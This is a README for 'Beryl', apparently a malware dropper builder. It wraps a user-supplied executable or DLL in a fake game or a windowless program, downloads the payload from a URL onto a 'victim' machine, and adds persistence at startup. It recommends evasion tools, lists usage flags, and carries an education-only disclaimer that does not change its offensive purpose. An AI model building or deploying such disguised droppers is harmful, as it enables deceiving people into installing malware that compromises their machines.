![Alt text](<2023-08-31 09_57_39-Command Prompt.png>)


Greetings
--------------------

Beryl delivers your PE (exe or dll) straight to the victim in form of a game or a no gui 

DISCLAIMER :
----------------------

ME The author takes NO responsibility and/or liability for how you choose to use any of the tools/source code/any files provided. ME The author and anyone affiliated with will not be liable for any losses and/or damages in connection with use of Beryl. By using Beryl or any files included, you understand that you are AGREEING TO USE AT YOUR OWN RISK. Once again Beryl is for EDUCATION and/or RESEARCH purposes ONLY.

victim only has to run the generated file wich execute as UA by default

if user doesn t execute as admin programme won't run

added persistance (payload starts every time at start up)

ps: you need a valid link to install your PE on the victim machine
    also your PE should at least use some evasion techniques 
    you can use tools like Scarecrow ,Myph,Veil .... to compile your payload (shellcode or bin) into a PE  ;)

Setup: (works on windows , for linux just run and then compile the pew.py in a windows env or use wine ) [wine-tuto](https://github.com/ELMERIKH/Keres/blob/master/wine-tuto/wine.md)
-------------------------------------------------------------------

pip install -r requirements.txt 

Python3 Beryl.py

usage: 
---------------------------

beryl.py [-h] 

-d DIRECTORY_PATH (in the HOME env of the user)

-url URL (url to install your PE)

-n OUTPUT_NAME 

[-g {Snake,FlapyBird,Turtle,RaceCar}] (GUI)

-dll function (name of function to run with the dll file)

To Do :

add some obfuscation 

